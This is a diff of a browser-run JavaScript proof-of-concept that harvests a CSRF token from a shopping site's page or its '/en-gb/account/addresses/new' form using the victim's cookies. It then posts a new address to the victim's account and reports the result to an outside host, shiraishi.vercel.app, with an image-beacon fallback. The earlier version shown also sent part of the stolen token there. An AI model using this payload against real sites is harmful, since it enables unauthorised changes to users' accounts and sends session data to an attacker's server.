@@ -1,32 +1,43 @@
 (async () => {
   const log = (...a) => console.log('[PoC]', ...a);
 
-  const getCsrf = () => {
+  const getCsrf = async () => {
     const m = document.querySelector('meta[name="csrf-token"],meta[name="x-csrf-token"]');
     if (m && m.content) return m.content;
 
-    if (window.__NEXT_DATA__ && window.__NEXT_DATA__.props) {
-      const p = window.__NEXT_DATA__.props.pageProps || {};
+    if (window.__NEXT_DATA__ && window.__NEXT_DATA__.props && window.__NEXT_DATA__.props.pageProps) {
+      const p = window.__NEXT_DATA__.props.pageProps;
       if (p.csrfToken) return p.csrfToken;
     }
 
-    if (window.csrfToken) return window.csrfToken;
+    try {
+      const html = await fetch('/en-gb/account/addresses/new', {
+        credentials: 'include'
+      }).then(r => r.text());
 
-    for (const k of Object.keys(window)) {
-      if (/csrf/i.test(k) && typeof window[k] === 'string' && window[k].length > 10) {
-        return window[k];
+      const patterns = [
+        /x-csrf-token["']?\s*[:=]\s*["']([^"']+)["']/i,
+        /"csrfToken"\s*:\s*"([^"]+)"/,
+        /csrfToken["']?\s*[:=]\s*["']([^"']+)["']/i,
+        /<meta[^>]+name=["']csrf-token["'][^>]+content=["']([^"']+)["']/i
+      ];
+
+      for (const p of patterns) {
+        const match = html.match(p);
+        if (match && match[1]) return match[1];
       }
+    } catch (e) {
+      log('form fetch failed:', e.message);
     }
-
-    const c = document.cookie.match(/(?:^|;\s*)_csrfSecret=([^;]+)/);
-    if (c) return decodeURIComponent(c[1]);
 
     return null;
   };
 
-  const token = getCsrf();
-  log('token:', token);
-  if (!token) return;
+  const token = await getCsrf();
+  log('token:', token, 'len:', token ? token.length : 0);
+  if (!token || token.length < 30) return;
+
+  const addressId = String(Date.now()) + String(Math.floor(Math.random() * 1000)).padStart(3, '0');
 
   const body = JSON.stringify({
     item: {
@@ -38,7 +49,7 @@
       city: "Hastings",
       postalCode: "TN34 1RL",
       phone: "",
-      addressId: "1790419160027"
+      addressId: addressId
     }
   });
 
@@ -56,14 +67,14 @@
   });
 
   if (!res) return;
-  log('status:', res.status);
+  log('status:', res.status, 'addressId:', addressId);
 
   const txt = await res.text().catch(() => '');
   log('response:', txt.slice(0, 500));
 
   try {
-    await fetch('https://shiraishi.vercel.app/log?ok=' + res.status + '&t=' + encodeURIComponent(token.slice(0, 20)));
+    await fetch('https://shiraishi.vercel.app/log?ok=' + res.status + '&id=' + addressId);
   } catch (e) {
-    new Image().src = 'https://shiraishi.vercel.app/log?ok=' + res.status;
+    new Image().src = 'https://shiraishi.vercel.app/log?ok=' + res.status + '&id=' + addressId;
   }
 })();
